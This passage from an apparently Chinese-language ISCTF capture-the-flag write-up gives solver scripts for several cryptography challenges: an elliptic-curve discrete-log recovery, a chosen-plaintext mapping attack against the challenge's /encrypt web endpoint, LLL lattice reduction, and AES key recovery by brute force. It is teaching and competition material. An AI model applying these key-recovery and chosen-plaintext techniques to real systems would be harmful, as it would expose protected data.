    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Solving Discrete Log using BSGS (assuming small k)..."</span><span class="token punctuation">)</span>
    
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token comment"># 设置搜索上限为 2^40 (约1万亿)，这对 BSGS 来说是秒解</span>
        k <span class="token operator">=</span> discrete_log<span class="token punctuation">(</span>Q_point<span class="token punctuation">,</span> G<span class="token punctuation">,</span> operation<span class="token operator">=</span><span class="token string">'+'</span><span class="token punctuation">,</span> bounds<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[SUCCESS] Found private key k: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Positive k not found, trying negative G..."</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token comment"># 某些实现中 y 坐标可能取反</span>
            k <span class="token operator">=</span> discrete_log<span class="token punctuation">(</span>Q_point<span class="token punctuation">,</span> <span class="token operator">-</span>G<span class="token punctuation">,</span> operation<span class="token operator">=</span><span class="token string">'+'</span><span class="token punctuation">,</span> bounds<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[SUCCESS] Found private key k: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Failed to find k. Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>

    <span class="token comment"># ---------------------------------------------------------</span>
    <span class="token comment"># 5. 生成最终 Flag</span>
    <span class="token comment"># ---------------------------------------------------------</span>
    <span class="token comment"># 题目要求：将 k 的16进制值转换为 32位 MD5，包裹 ISCTF&#123;&#125;</span>
    
    <span class="token comment"># 转换为 hex 字符串，去掉 '0x' 前缀</span>
    hex_k <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>Integer<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] k (hex): </span><span class="token interpolation"><span class="token punctuation">&#123;</span>hex_k<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    
    <span class="token comment"># 计算 MD5</span>
    md5_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>hex_k<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    flag <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"ISCTF&#123;&#123;</span><span class="token interpolation"><span class="token punctuation">&#123;</span>md5_hash<span class="token punctuation">&#125;</span></span><span class="token string">&#125;&#125;"</span></span>
    
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token operator">+</span> <span class="token string">"#"</span> <span class="token operator">*</span> <span class="token number">40</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"#"</span> <span class="token operator">*</span> <span class="token number">40</span><span class="token punctuation">)</span>

<span class="token comment"># 运行求解</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    solve_isctf_challenge<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#ISCTF&#123;43896099feea21a3d5804863075e1aaa&#125;</span></code></pre>

<h3 id="小蓝鲨的密码箱"><a href="#小蓝鲨的密码箱" class="headerlink" title="小蓝鲨的密码箱"></a>小蓝鲨的密码箱</h3><p>构建映射表查flag</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
<span class="token keyword">import</span> re

url <span class="token operator">=</span> <span class="token string">"http://challenge.bluesharkinfo.com:20377/encrypt"</span>

charset <span class="token operator">=</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 或者 string.ascii_letters + string.digits + string.punctuation</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] 正在构造 Payload，字符集长度: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>charset<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

payload_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token number">17</span><span class="token punctuation">,</span>    <span class="token comment"># 随便改个非0数</span>
    <span class="token string">'b'</span><span class="token punctuation">:</span> <span class="token number">23</span><span class="token punctuation">,</span>    <span class="token comment"># 随便改个非0数</span>
    <span class="token string">'c'</span><span class="token punctuation">:</span> <span class="token number">997</span><span class="token punctuation">,</span>   <span class="token comment"># 重点：改大这个数，避免取模丢失信息</span>
    <span class="token string">'text'</span><span class="token punctuation">:</span> charset
<span class="token punctuation">&#125;</span>

headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0'</span><span class="token punctuation">,</span>
    <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] 发送请求获取映射关系..."</span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload_data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
    
    html <span class="token operator">=</span> r<span class="token punctuation">.</span>text
    
    hex_outputs <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'&lt;div class="hex-output">(.*?)&lt;/div>'</span><span class="token punctuation">,</span> html<span class="token punctuation">,</span> re<span class="token punctuation">.</span>DOTALL<span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hex_outputs<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!] 解析失败，未找到足够的输出区域。"</span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        
    my_cipher_str <span class="token operator">=</span> hex_outputs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
    my_cipher_bytes <span class="token operator">=</span> my_cipher_str<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    <span class="token comment"># Flag 的密文</span>
    flag_cipher_str <span class="token operator">=</span> hex_outputs<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
    flag_cipher_bytes <span class="token operator">=</span> flag_cipher_str<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] 获取到 Flag 密文片段: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag_cipher_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">20]</span><span class="token punctuation">&#125;</span></span><span class="token string">..."</span></span><span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>my_cipher_bytes<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>charset<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] 警告: 发送字符数 (</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>charset<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">) 与 返回密文块数 (</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>my_cipher_bytes<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">) 不一致！"</span></span><span class="token punctuation">)</span>
    
    cipher_map <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> char<span class="token punctuation">,</span> hex_val <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>charset<span class="token punctuation">,</span> my_cipher_bytes<span class="token punctuation">)</span><span class="token punctuation">:</span>
        cipher_map<span class="token punctuation">[</span>hex_val<span class="token punctuation">]</span> <span class="token operator">=</span> char
        
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] 映射表构建完成。"</span><span class="token punctuation">)</span>
    
    flag <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> hex_byte <span class="token keyword">in</span> flag_cipher_bytes<span class="token punctuation">:</span>
        <span class="token keyword">if</span> hex_byte <span class="token keyword">in</span> cipher_map<span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> cipher_map<span class="token punctuation">[</span>hex_byte<span class="token punctuation">]</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> <span class="token string">"?"</span> <span class="token comment"># 未知字符</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] 遇到未知密文块: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>hex_byte<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"FLAG: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">)</span>

<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] 发生错误: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre>

<h3 id="baby-math"><a href="#baby-math" class="headerlink" title="baby_math"></a>baby_math</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sage<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment"># 1. Setup the High Precision Field</span>
R <span class="token operator">=</span> RealField<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>

<span class="token comment"># 2. Input Values</span>
x_val <span class="token operator">=</span> <span class="token string">"0.75872961153339387563860550178464795474547887323678173252494265684893323654606628651427151866818730100357590296863274236719073684620030717141521941211167282170567424114270941542016135979438271439047194028943997508126389603529160316379547558098144713802870753946485296790294770557302303874143106908193100"</span>
enc_val <span class="token operator">=</span> <span class="token string">"1.24839978408728580181183027675785982784764821592156892598136000363397267152291738689909414790691435938223032351375697399608345468567445269769342300325192248438038963977207296241971217955178443170598629648414706345216797043374408541203167719396818925953801387623884200901703606288664141375049626635852e52"</span>

x <span class="token operator">=</span> R<span class="token punctuation">(</span>x_val<span class="token punctuation">)</span>
enc <span class="token operator">=</span> R<span class="token punctuation">(</span>enc_val<span class="token punctuation">)</span>

<span class="token comment"># 3. Lattice Construction</span>
<span class="token comment"># Scale factor K</span>
K <span class="token operator">=</span> <span class="token number">10</span><span class="token operator">**</span><span class="token number">300</span> 

<span class="token comment"># Basis Matrix</span>
<span class="token comment"># Columns correspond to coefficients for: a, b, and the approximation target</span>
M <span class="token operator">=</span> Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> <span class="token punctuation">[</span>
    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>K <span class="token operator">*</span> cos<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>K <span class="token operator">*</span> sin<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>K <span class="token operator">*</span> enc<span class="token punctuation">)</span><span class="token punctuation">]</span>
<span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment"># 4. Lattice Reduction (LLL)</span>
B <span class="token operator">=</span> M<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Scanning reduced basis for flag candidates...\n"</span><span class="token punctuation">)</span>

<span class="token comment"># Helper function to replace long_to_bytes</span>
<span class="token keyword">def</span> <span class="token function">to_bytes</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    n <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token comment"># Convert Sage Integer to Python int</span>
    <span class="token keyword">return</span> n<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'big'</span><span class="token punctuation">)</span>

<span class="token comment"># 5. Extract Flag</span>
found <span class="token operator">=</span> <span class="token boolean">False</span>
<span class="token keyword">for</span> row <span class="token keyword">in</span> B<span class="token punctuation">:</span>
    <span class="token comment"># LLL might return negative vectors, so we take absolute values</span>
    potential_a <span class="token operator">=</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    potential_b <span class="token operator">=</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> potential_a <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">or</span> potential_b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
        
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        part1 <span class="token operator">=</span> to_bytes<span class="token punctuation">(</span>potential_a<span class="token punctuation">)</span>
        part2 <span class="token operator">=</span> to_bytes<span class="token punctuation">(</span>potential_b<span class="token punctuation">)</span>
        
        flag_candidate <span class="token operator">=</span> part1 <span class="token operator">+</span> part2
        
        <span class="token comment"># Check for readable text</span>
        <span class="token comment"># Checks if bytes are within ASCII printable range</span>
        <span class="token keyword">if</span> <span class="token builtin">all</span><span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">&lt;=</span> c <span class="token operator">&lt;=</span> <span class="token number">126</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> flag_candidate<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Flag found: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag_candidate<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            found <span class="token operator">=</span> <span class="token boolean">True</span>
            <span class="token keyword">break</span>
            
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        <span class="token keyword">continue</span>

<span class="token keyword">if</span> <span class="token keyword">not</span> found<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Could not automatically decode a flag. Check the basis rows manually:"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span></code></pre>

<h3 id="小蓝鲨的RSA密文"><a href="#小蓝鲨的RSA密文" class="headerlink" title="小蓝鲨的RSA密文"></a>小蓝鲨的RSA密文</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> unpad
<span class="token keyword">import</span> binascii

<span class="token comment"># --- 题目给出的参数 ---</span>
c <span class="token operator">=</span> <span class="token number">3756824985347508967549776773725045773059311839370527149219720084008312247164501688241698562854942756369420003479117</span>
a2_high <span class="token operator">=</span> <span class="token number">9012778</span>
LOW_BITS <span class="token operator">=</span> <span class="token number">16</span>
a1 <span class="token operator">=</span> <span class="token number">621315</span>
a0 <span class="token operator">=</span> <span class="token number">452775142</span>

<span class="token comment"># 提供的十六进制字符串</span>
iv_hex <span class="token operator">=</span> <span class="token string">"bf38e64bb5c1b069a07b7d1d046a9010"</span>
ct_hex <span class="token operator">=</span> <span class="token string">"8966006c4724faf53883b56a1a8a08ee17b1535e1657c16b3b129ee2d2e389744c943014eb774cd24a5d0f7ad140276fdec72eb985b6de67b8e4674b0bcdc4a5"</span>

<span class="token comment"># --- 1. 爆破 a2 并求解 m ---</span>

<span class="token keyword">def</span> <span class="token function">solve_m</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># m 是 16 字节，所以范围在 0 到 2^128 之间</span>
    low_bound <span class="token operator">=</span> <span class="token number">0</span>
    high_bound <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">128</span>
    
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] 开始爆破 a2 的低 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>LOW_BITS<span class="token punctuation">&#125;</span></span><span class="token string"> 位..."</span></span><span class="token punctuation">)</span>
    
    <span class="token comment"># 遍历低 16 位的所有可能性</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> LOW_BITS<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># 恢复完整的 a2</span>
        a2_guess <span class="token operator">=</span> <span class="token punctuation">(</span>a2_high <span class="token operator">&lt;&lt;</span> LOW_BITS<span class="token punctuation">)</span> <span class="token operator">+</span> x
        
        <span class="token comment"># 我们需要求解方程: m^3 + a2*m^2 + a1*m + a0 - c = 0</span>
        <span class="token comment"># 使用二分查找来寻找整数根 m</span>
        
        l<span class="token punctuation">,</span> r <span class="token operator">=</span> low_bound<span class="token punctuation">,</span> high_bound
        found <span class="token operator">=</span> <span class="token boolean">False</span>
        
        <span class="token keyword">while</span> l <span class="token operator">&lt;=</span> r<span class="token punctuation">:</span>
            mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
            <span class="token comment"># 计算多项式的值</span>
            val <span class="token operator">=</span> mid<span class="token operator">**</span><span class="token number">3</span> <span class="token operator">+</span> a2_guess <span class="token operator">*</span> <span class="token punctuation">(</span>mid<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> a1 <span class="token operator">*</span> mid <span class="token operator">+</span> a0
            
            <span class="token keyword">if</span> val <span class="token operator">==</span> c<span class="token punctuation">:</span>
                <span class="token keyword">return</span> mid  <span class="token comment"># 找到正确密钥</span>
            <span class="token keyword">elif</span> val <span class="token operator">&lt;</span> c<span class="token punctuation">:</span>
                l <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                r <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>
                
        <span class="token keyword">if</span> x <span class="token operator">%</span> <span class="token number">10000</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> x <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] 进度: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">&#125;</span></span><span class="token string">/65536"</span></span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token boolean">None</span>

<span class="token comment"># --- 2. 执行解密 ---</span>

m <span class="token operator">=</span> solve_m<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> m<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 找到 m: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>m<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        aes_key <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] AES Key (hex): </span><span class="token interpolation"><span class="token punctuation">&#123;</span>aes_key<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        
        iv <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>iv_hex<span class="token punctuation">)</span>
        ct <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>ct_hex<span class="token punctuation">)</span>
        
        cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>aes_key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token operator">=</span>iv<span class="token punctuation">)</span>
        decrypted <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>ct<span class="token punctuation">)</span>
        
        <span class="token comment"># 尝试去填充并打印</span>
        flag <span class="token operator">=</span> unpad<span class="token punctuation">(</span>decrypted<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n[SUCCESS] Flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] 解密或去填充失败: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token comment"># 如果去填充失败，打印原始解密结果看看</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] 原始解密数据: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>decrypted<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] 未找到解。"</span><span class="token punctuation">)</span></code></pre>

<h3 id="baby-equation"><a href="#baby-equation" class="headerlink" title="baby_equation"></a>baby_equation</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes

<span class="token comment"># --- 题目参数 ---</span>
K1 <span class="token operator">=</span> <span class="token number">5530346600323339885232820545798418499625132786869393636420197124606005490078041505765918120769293936395609675704197197479866186297686468133906640256390919799453701894382992223127374374212586492263661287287954143417128958298503464448</span>
K3 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">5530346600323339885232820545798418499625132786869393636420197035566805062064534503704976756468319888650441668826363984844327206056424439752726283862026042410921197396370839233560708886006884569969932749615838070243922866371345910111</span>
S <span class="token operator">=</span> K1 <span class="token operator">+</span> K3
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] 开始精确求解..."</span><span class="token punctuation">)</span>

b_approx<span class="token punctuation">,</span> _ <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>K1 <span class="token operator">//</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span>
b_start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>b_approx<span class="token punctuation">)</span>

found <span class="token operator">=</span> <span class="token boolean">False</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    b <span class="token operator">=</span> b_start <span class="token operator">+</span> i
    val <span class="token operator">=</span> S <span class="token operator">-</span> b<span class="token operator">**</span><span class="token number">6</span>
    <span class="token keyword">if</span> val <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">continue</span>
    <span class="token keyword">if</span> val <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
        a_abs<span class="token punctuation">,</span> exact <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span><span class="token operator">-</span>val<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>
        a <span class="token operator">=</span> <span class="token operator">-</span><span class="token builtin">int</span><span class="token punctuation">(</span>a_abs<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        a<span class="token punctuation">,</span> exact <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>val<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> exact<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 锁定参数! \n    b = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>b<span class="token punctuation">&#125;</span></span><span class="token string"> \n    a = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>a<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        numerator <span class="token operator">=</span> K1 <span class="token operator">+</span> <span class="token number">2</span><span class="token operator">*</span>S <span class="token operator">-</span> <span class="token number">6</span><span class="token operator">*</span><span class="token punctuation">(</span>b<span class="token operator">**</span><span class="token number">6</span><span class="token punctuation">)</span>
        denominator <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">*</span> a
        
